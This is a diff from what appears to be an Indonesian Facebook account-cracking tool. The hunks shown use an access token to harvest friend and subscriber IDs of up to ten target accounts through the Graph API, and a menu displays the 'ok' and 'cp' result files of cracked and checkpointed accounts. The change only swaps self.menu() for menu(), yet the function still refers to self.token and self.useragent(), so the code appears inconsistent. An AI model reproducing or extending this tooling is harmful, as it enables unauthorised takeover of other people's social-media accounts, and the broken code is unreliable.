@@ -336,7 +336,7 @@ def menu():
 			if(jumlah>=11):
 				print("     \033[1;37mTarget maximal \033[1;32m10\033[1;37m...!!!")
 				time.sleep(2)
-				self.menu()
+				menu()
 			else:pass
 		except:jumlah=1
 		print("\n \033[1;37mKetik '\033[1;36mme\033[1;37m' untuk crack daftar teman akun anda\n")
@@ -354,7 +354,7 @@ def menu():
 			except KeyError:
 				print("     \033[1;37mTarget tidak ada...!!!")
 				time.sleep(1)
-				self.menu()
+				menu()
 			r=json.loads(req.get(f"https://graph.facebook.com/{target}/friends?access_token={self.token}").text)
 			for x in r['data']:
 				idnya=x['id']
@@ -367,7 +367,7 @@ def menu():
 			if(jumlah>=11):
 				print("     \033[1;37mTarget maximal \033[1;32m10\033[1;37m...!!!")
 				time.sleep(2)
-				self.menu()
+				menu()
 			else:pass
 		except:jumlah=1
 		print("\n \033[1;37mKetik '\033[1;36mme\033[1;37m' untuk crack daftar teman akun anda\n")
@@ -384,7 +384,7 @@ def menu():
 			except KeyError:
 				print("     \033[1;37mTarget tidak ada...!!!")
 				time.sleep(1)
-				self.menu()
+				menu()
 			r=json.loads(req.get(f'https://graph.facebook.com/{target}/subscribers?limit=50000&access_token={self.token}').text)
 			for x in r['data']:
 				idnya=x['id']
@@ -398,20 +398,20 @@ def menu():
 			try:
 				print("\n"+open("ok","r").read())
 				input("Enter For Back To Menu")
-				self.menu()
+				menu()
 			except FileNotFoundError:
 				input("\n \033[1;36m[\033[1;37m!\033[1;36m] \033[1;37mAnda belum mendapatkan hasil \033[1;36mOK\nEnter For Back To Menu")
-				self.menu()
+				menu()
 		elif(hh in ("02","2")):
 			try:
 				print("\n"+open("cp","r").read())
 				input("Enter For Back To Menu")
-				self.menu()
+				menu()
 			except FileNotFoundError:
 				input("\n \033[1;36m[\033[1;37m!\033[1;36m] \033[1;37mAnda belum mendapatkan hasil \033[1;36mCP\nEnter For Back To Menu")
-				self.menu()
+				menu()
 		elif(hh in ("03","3")):
-			self.menu()
+			menu()
 	elif(pil in ("04","4")):
 		self.useragent()
 	elif(pil in ('05','5')):
